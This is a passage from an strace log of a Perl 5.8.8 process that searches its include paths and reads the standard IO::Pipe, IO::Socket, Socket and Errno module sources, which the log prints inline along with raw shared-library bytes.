IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
7464  07:18:53.279319 _llseek(6, 3425, [3425], SEEK_SET) = 0
7464  07:18:53.279369 _llseek(6, 0, [3425], SEEK_CUR) = 0
7464  07:18:53.279400 close(6)          = 0
7464  07:18:53.279455 stat64("/etc/perl/IO/Socket.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.279485 stat64("/etc/perl/IO/Socket.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.279499 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.279511 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.279525 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.279538 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.279552 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.279563 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.279576 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.279588 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.279601 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.279613 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
7464  07:18:53.279634 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
7464  07:18:53.279648 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6cce8) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.279659 _llseek(6, 0, [0], SEEK_CUR) = 0
7464  07:18:53.279676 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
7464  07:18:53.280046 stat64("/etc/perl/Socket.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.280062 stat64("/etc/perl/Socket.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.280075 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.280088 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.280101 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.280117 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.280131 stat64("/usr/lib/perl5/Socket.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.280142 stat64("/usr/lib/perl5/Socket.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.280155 stat64("/usr/share/perl5/Socket.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.280167 stat64("/usr/share/perl5/Socket.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.280179 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.280191 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
7464  07:18:53.280211 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.280225 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.280236 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.280253 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
7464  07:18:53.280684 brk(0x8239000)    = 0x8239000
7464  07:18:53.280963 read(8, "", 4096) = 0
7464  07:18:53.280978 close(8)          = 0
7464  07:18:53.281064 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
7464  07:18:53.281089 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
7464  07:18:53.281115 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
7464  07:18:53.281129 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
7464  07:18:53.281217 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
7464  07:18:53.281235 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d8d000
7464  07:18:53.281249 mmap2(0xb7d92000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d92000
7464  07:18:53.281264 close(8)          = 0
7464  07:18:53.281936 brk(0x825a000)    = 0x825a000
7464  07:18:53.282084 stat64("/etc/perl/Errno.pmc",  <unfinished ...>
7462  07:18:53.282104 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
7464  07:18:53.282113 <... stat64 resumed> 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.282121 stat64("/etc/perl/Errno.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.282135 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7462  07:18:53.282147 <... rt_sigprocmask resumed> NULL, 8) = 0
7464  07:18:53.282153 stat64("/usr/local/lib/perl/5.8.8/Errno.pm",  <unfinished ...>
7462  07:18:53.282171 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
7464  07:18:53.282180 <... stat64 resumed> 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.282188 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.282201 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.282215 stat64("/usr/lib/perl5/Errno.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7462  07:18:53.282226 <... rt_sigprocmask resumed> [], 8) = 0
7462  07:18:53.282239 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
7464  07:18:53.282247 stat64("/usr/lib/perl5/Errno.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.282260 stat64("/usr/share/perl5/Errno.pmc",  <unfinished ...>
7462  07:18:53.282268 <... rt_sigprocmask resumed> NULL, 8) = 0
7462  07:18:53.282274 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
7462  07:18:53.282287 rt_sigaction(SIGINT, {0x807f150, [], 0},  <unfinished ...>
7464  07:18:53.282295 <... stat64 resumed> 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.282301 stat64("/usr/share/perl5/Errno.pm",  <unfinished ...>
7462  07:18:53.282309 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
7464  07:18:53.282316 <... stat64 resumed> 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7462  07:18:53.282339 waitpid(-1,  <unfinished ...>
7464  07:18:53.282379 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.282393 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
7464  07:18:53.282444 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.282459 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.282470 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.282490 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub 